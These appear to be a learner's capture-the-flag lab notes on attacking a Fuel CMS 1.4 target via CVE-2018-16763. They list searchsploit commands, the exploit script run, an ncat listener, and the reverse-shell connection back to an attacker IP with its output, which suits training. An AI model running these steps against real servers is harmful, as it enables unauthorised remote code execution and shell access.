Vulnerability Capstone:
    * "Ackme Support Incorporated has recently set up a new blog. 
    Their developer team have asked for a security audit to be performed 
    before they create and publish articles to the public."

    TARGET:         "  10.10.119.123   "

    Steps:
        1.  Navigate to URL. found: [Application name: Fuel CMS     Version: 1.4]
        2.  Use searchsploit        [searchsploit fuel cms]
            "Fuel CMS 1.4.1 - Remote Code Execution (3)  | php/webapps/50477.py"

        ** Going online, searching, found CVE   [CVE-2018-16763]

        3.  Move from offline DB:   [searchsploit -m 50477.py]
        4.  Inspect script:         [cat 50477.py]   
        5.  Run script, use option: [python3 50477.py -u http://10.10.119.123
            ]
                => RCE ACHIEVED!

        6.  HOWEVER, CANNOT SEE OUTPUT. THEREFORE NEED NETCAT REVERSE LISTENER!
            
                * First run [ifconfig -a] to find home IP "172.19.212.108"
                cd into where we want to save flag. (can also provide path instead of flag.txt)
                WITHIN NEW POWERSHELL:      [ncat -lvp 1234]        Listens on port 1234, verbose.
            
        7.  Now that listener is set up, rerun script and use shell_me. Creates link between target and attackbox.
                [
                    fuelCMS$ shell_me
                    Enter your attacking machine IP:PORT $ 10.10.238.189:1234
                ]

        8.  Confirm shell access on listener terminal:
                [
                    Listening on 0.0.0.0 1234
                    Connection received on 10.10.119.123 43440
                    /bin/sh: 0: can't access tty; job control turned off
                    $ 
                ]

                Get flag!
